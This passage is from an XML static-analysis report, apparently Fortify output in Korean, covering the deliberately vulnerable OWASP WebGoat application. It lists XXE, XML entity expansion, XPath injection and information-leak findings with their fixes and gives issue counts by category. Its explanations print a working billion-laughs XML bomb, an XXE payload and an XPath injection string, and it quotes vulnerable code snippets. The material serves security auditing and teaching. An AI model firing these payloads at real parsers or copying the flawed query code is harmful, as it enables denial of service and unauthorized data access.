
예제 4: 다음 코드는 catch된 예외의 스택 추적을 응용 프로그램 내에서만 브로드캐스트하여, 시스템의 다른 응용 프로그램으로 누출될 수 없도록 합니다. 또한 이 기술은 시스템을 통해 글로벌로 브로드캐스트하는 것보다 효율적입니다.


...
try {
  ...
} catch (Exception e) {
    String exception = Log.getStackTraceString(e);
    Intent i = new Intent();
    i.setAction("SEND_EXCEPTION");
    i.putExtra("exception", exception);
    LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i);
}
...


Android 장치에서 NFC를 통한 시스템 데이터 누출이 염려되면 다음의 세 가지 작업 중 하나를 수행하면 됩니다. 즉 범위 내에 있는 다른 장치로 푸시되는 메시지에 시스템 데이터를 포함하지 않거나, 메시지 페이로드를 암호화하거나, 상위 계층에 보안 통신 채널을 설정합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. System information leak을 예방하는 데 래퍼 스크립트, 회사 IT 정책 또는 빠른 판단력을 가진 시스템 관리자에만 의존하지 마십시오. 자체적으로 안전한 소프트웨어를 작성해야 합니다.

2. 이 카테고리의 취약점은 모든 유형의 프로그램에 적용되지 않습니다. 예를 들어, 응용 프로그램이 공격자가 이미 시스템 정보를 확보한 클라이언트 시스템에서 실행되거나 시스템 정보를 신뢰할 수 있는 로그 파일에만 인쇄하는 경우, Audit Guide를 사용하여 스캔 결과에서 이 카테고리의 취약점을 필터링할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4092E1B7A25DC7BC44EAECCD8F8BB8A4" ruleID="28B6B5C0-D921-4EED-BA2B-F988C4936EF4">
                            <Category>System Information Leak: External</Category>
                            <Folder>High</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 함수는 200 줄의 print()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. print()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>200</LineStart>
<Snippet>				&lt;/div&gt;
				&lt;div id="lessonContent"&gt;&lt;%=webSession.getInstructions()%&gt;&lt;/div&gt;
				&lt;div id="message" class="info"&gt;&lt;%=webSession.getMessage()%&gt;&lt;/div&gt;
	
			&lt;%</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>71</LineStart>
<Snippet>	try
	{
	    String dir = s.getContext().getRealPath("/lesson_plans");
	    File d = new File(dir);
</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>WsSAXInjection.java:179에 구성된 XML 파서는 DTD(Document Type Definition) 엔터티 확인을 방지하거나 제한하지 않습니다. 따라서 파서가 XML 엔터티 확장 injection에 노출될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XML Bombs라고 하는 XML Entity Expansion injection은 서버의 할당된 리소스를 모두 소모할 때까지 기하급수적으로 확장되는 올바른 형식의 유효한 XML 블록을 이용하는 DoS(Denial of Service) 공격입니다. XML을 사용하면 문자열 대체 매크로로 작동하는 사용자 지정 엔터티를 정의할 수 있습니다. 되풀이되는 엔터티 확인을 중첩시켜 공격자가 서버 리소스를 쉽게 중단시킬 수 있습니다.

다음 XML 문서에서는 XML 폭탄의 예를 보여 줍니다.

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;


이 테스트는 작은 XML 문서를 메모리에서 3GB 이상으로 확장시켜 서버를 중단시킬 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>XML 파서가 들어오는 XML 문서의 일부로 DTD(Document Type Definition) 사용자 지정 엔터티를 허용하지 않도록 안전하게 구성되어야 합니다.

XML 엔터티 확장 injection을 방지하려면 XML 팩토리, 파서 또는 판독기에 대해 "secure-processing" 속성을 설정해야 합니다.

factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);


JAXP 1.3 이전 버전에서는 보안 처리 기능이 켜져 있는 경우 DOM 및 SAX 파서에 대해 기본 제한이 설정됩니다. 이 제한은 다음과 같습니다.

entityExpansionLimit = 64,000
elementAttributeLimit = 10,000

JAXP 1.4부터는 보안 처리 기능이 기본적으로 켜집니다. 위의 제한과 더불어 검증 파서에 새로운 maxOccur 제한이 추가되었습니다. 이 제한은 다음과 같습니다.

maxOccur = 5,000


인라인 DOCTYPE 선언이 필요하지 않은 경우 다음 속성으로 완전히 비활성화할 수 있습니다.

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="BBC567EFA4F4314AFBFE6BF76601E2D7" ruleID="67F8265E-C832-4376-83EF-3EA086DB961E">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSAXInjection.java:179에 구성된 XML 파서는 DTD(Document Type Definition) 엔터티 확인을 방지하거나 제한하지 않습니다. 따라서 파서가 XML 엔터티 확장 injection에 노출될 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>179</LineStart>
<Snippet>	    PasswordChanger changer = new PasswordChanger();
	    reader.setContentHandler(changer);
	    reader.parse(new InputSource(new StringReader(xml)));
	    if (!"101".equals(changer.getId()))
	    {</Snippet>
<TargetFunction>org.xml.sax.XMLReader.parse()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XML External Entity Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>WsSAXInjection.java:179에 구성된 XML 파서는 외부 엔터티 확인을 방지하거나 제한하지 않습니다. 따라서 파서가 XML 외부 엔터티 공격에 노출될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XML 외부 엔터티 공격에서는 XML 기능을 활용하여 처리 시점에 동적으로 문서를 구성합니다. XML 엔터티를 사용하면 지정된 리소스에서 동적으로 데이터를 포함시킬 수 있습니다. 외부 엔터티를 사용하면 XML 문서에 외부 URI의 데이터를 포함할 수 있습니다. 다른 방식으로 처리하도록 구성하지 않은 경우 외부 엔터티는 XML 파서가 URI로 지정된 리소스(예: 로컬 컴퓨터 또는 원격 시스템의 파일)를 접근하게 만듭니다. 이 동작으로 인해 응용 프로그램이 XML 외부 엔터티(XXE) 공격에 노출되고, 이를 통해 로컬 시스템에서 denial of service를 발생시키고, 로컬 컴퓨터의 파일에 무단으로 접근하고, 원격 컴퓨터를 스캔하고, 원격 시스템에서 denial of service를 발생시킬 수 있습니다.

다음 XML 문서에서는 XXE 공격의 예를 보여 줍니다.

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 &lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;


이 예제에서 XML 파서가 엔터티를 /dev/random 파일의 컨텐츠로 대체하려고 시도하는 경우 서버가 중단될 수 있습니다(UNIX 시스템의 경우).</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>XML unmarshaller가 수신 XML 문서의 일부로 외부 엔터티를 허용하지 않도록 안전하게 구성되어야 합니다.

XXE injection을 방지하려면 XML 소스를 java.io.File, java.io.Reader 또는 java.io.InputStream으로 직접 처리하는 unmarshal 메서드를 사용하지 마십시오. 안전하게 구성된 파서로 문서를 구문 분석하고 다음 예에 표시된 것처럼 보안 파서를 XML 소스를 사용하는 unmarshal 메서드를 사용합니다.


DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(&lt;XML Source&gt;);
Model model = (Model) u.unmarshal(document);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="19CB89F1F7B672FBFF1128011115C382" ruleID="B1D6A836-C25A-4971-A9E8-6FCEBA60E3DB">
                            <Category>XML External Entity Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSAXInjection.java:179에 구성된 XML 파서는 외부 엔터티 확인을 방지하거나 제한하지 않습니다. 따라서 파서가 XML 외부 엔터티 공격에 노출될 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>179</LineStart>
<Snippet>	    PasswordChanger changer = new PasswordChanger();
	    reader.setContentHandler(changer);
	    reader.parse(new InputSource(new StringReader(xml)));
	    if (!"101".equals(changer.getId()))
	    {</Snippet>
<TargetFunction>org.xml.sax.XMLReader.parse()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XPath Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>XPATHInjection.java의 158 줄에서 createContent() 메서드는 확인되지 않은 입력을 사용하여 만들어진 XPath 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 XPath 쿼리를 실행할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XPath injection은 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스에서 데이터가 프로그램에 입력됩니다.




2. 데이터를 사용하여 XPath 쿼리를 동적으로 생성합니다.



예제 1: 다음 코드는 주어진 계정 ID의 전자 메일 주소를 검색하는 XPath 쿼리를 동적으로 구성 및 실행합니다. 계정 ID는 HTTP 요청에서 읽어들이므로 신뢰할 수 없습니다.


...
String acctID = request.getParameter("acctID");
String query = null;
if(acctID != null) {
       StringBuffer sb = new StringBuffer("/accounts/account[acctID='");
       sb.append(acctID);
       sb.append("']/email/text()");
       query = sb.toString();
}

DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();
domFactory.setNamespaceAware(true);
DocumentBuilder builder = domFactory.newDocumentBuilder();
Document doc = builder.parse("accounts.xml");
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();
XPathExpression expr = xpath.compile(query);
Object result = expr.evaluate(doc, XPathConstants.NODESET);
...


계정 번호 1에 속하는 전자 메일 주소를 검색하는 등 일반적인 조건에서는 이 코드가 실행하는 쿼리가 다음과 유사합니다.

/accounts/account[acctID='1']/email/text()

하지만 상수인 기본 쿼리 문자열과 사용자 입력 문자열을 연결하여 쿼리를 동적으로 생성하기 때문에, 쿼리는 acctID에 작은따옴표가 들어 있지 않은 경우에만 정확하게 동작합니다. 공격자가 acctID에 1' or '1' = '1 문자열을 입력하면 쿼리는 다음과 같습니다.

/accounts/account[acctID='1' or '1' = '1']/email/text()

1' or '1' = '1 조건을 추가하면 where 절이 항상 true로 평가하기 때문에 쿼리는 훨씬 간단한 다음 쿼리와 논리적으로 동일하게 됩니다.

//email/text()

공격자는 이렇게 쿼리를 단순화하여 쿼리가 인증된 사용자가 소유한 항목만 반환해야 한다는 요구 사항을 무시할 수 있습니다. 이제 쿼리는 지정된 소유자와 관계없이 문서에 저장된 모든 전자 메일 주소를 반환합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>XPath injection 취약점의 원인은 공격자가 XPath 쿼리의 컨텍스트를 변경하여 프로그래머가 데이터로 해석되기를 바라는 값을 명령으로 해석되도록 만들 수 있다는 점입니다. XPath 쿼리를 생성할 때, 프로그래머는 무엇이 명령으로 해석되어야 하고 무엇이 데이터로 해석되어야 하는지 알고 있습니다.

공격자가 프로그래머의 의도를 훼손하지 않도록 방지하려면 허용 목록을 사용하여 XPath 쿼리에 사용된 사용자가 제어하는 값이 예상한 문자 집합으로만 이루어지는지 확인하고 사용되는 컨텍스트를 고려하여 임의의 XPath 메타 문자가 포함되지 않도록 하십시오. 사용자가 제어하는 값에 XPath 메타 문자가 포함되어 있어야 할 경우, 적절한 인코딩 메커니즘을 사용하여 XPath 쿼리 내에서 특수한 의미를 제거합니다.

예제 2

...
String acctID = request.getParameter("acctID");
String query = null;
if(acctID != null) {
       Integer iAcctID = -1;
       try {
              iAcctID = Integer.parseInt(acctID);
       }
       catch (NumberFormatException e) {
              throw new InvalidParameterException();
       }
       StringBuffer sb = new StringBuffer("/accounts/account[acctID='");
       sb.append(iAcctID.toString());
       sb.append("']/email/text()");
       query = sb.toString();
}

DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();
domFactory.setNamespaceAware(true);
DocumentBuilder builder = domFactory.newDocumentBuilder();
Document doc = builder.parse("accounts.xml");
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();
XPathExpression expr = xpath.compile(query);
Object result = expr.evaluate(doc, XPathConstants.NODESET);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.

2. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C60AE754EFD609218E5CAD052E66D479" ruleID="F0E4F1C5-E664-40CA-A8AD-71F1DD742306">
                            <Category>XPath Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XPATHInjection.java의 158 줄에서 createContent() 메서드는 확인되지 않은 입력을 사용하여 만들어진 XPath 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 XPath 쿼리를 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>158</LineStart>
<Snippet>	    String expression = "/employees/employee[loginID/text()='"
		    + username + "' and passwd/text()='" + password + "']";
	    nodes = (NodeList) xPath.evaluate(expression, inputSource,
		    XPathConstants.NODESET);
	    int nodesLength = nodes.getLength();</Snippet>
<TargetFunction>javax.xml.xpath.XPath.evaluate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Issue Count by Category</Title>
        <SubSection enabled="true">
            <Title>Issues By Category</Title>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="512">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="242">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="192">
                        <groupTitle>System Information Leak</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="149">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="89">
                        <groupTitle>Privacy Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="67">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="64">
                        <groupTitle>Access Control: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="58">
                        <groupTitle>SQL Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="52">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Code Correctness: Constructor Invokes Overridable Function</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="42">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="32">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="29">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="19">
                        <groupTitle>Password Management: Hardcoded Password</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Hidden Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="13">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>Portability Flaw: Locale Dependent Comparison</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Dangerous File Inclusion</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Insecure Transport: External Link</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Log Forging</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Null Dereference</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Denial of Service</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Axis 2 Misconfiguration: Debug Information</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>J2EE Bad Practices: Threads</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Poor Style: Non-final Public Static Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>J2EE Bad Practices: getConnection()</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Open Redirect</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Path Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Code Correctness: Erroneous String Compare</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Header Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Missing Check against Null</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Poor Style: Redundant Initialization</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Weak Cryptographic Hash: Insecure PBE Iteration Count</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Weak Encryption</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Code Correctness: Multiple Stream Commits</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Command Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Expression is Always false</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Bad Practices: Non-Serializable Object Stored in Session</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Privacy Violation: Autocomplete</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Redundant Null Check</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>System Information Leak: Incomplete Servlet Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unreleased Resource: Sockets</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unsafe Reflection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Code Correctness: Byte Array to String Conversion</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Misconfiguration: Missing Data Transport Constraint</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Missing Check for Null Parameter</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Object Model Violation: Just one of equals() and hashCode() Defined</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Password Management: Empty Password</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Race Condition: Static Database Connection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Resource Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Unchecked Return Value</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Cryptographic Hash</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Cryptographic Hash: Hardcoded PBE Salt</groupTitle>
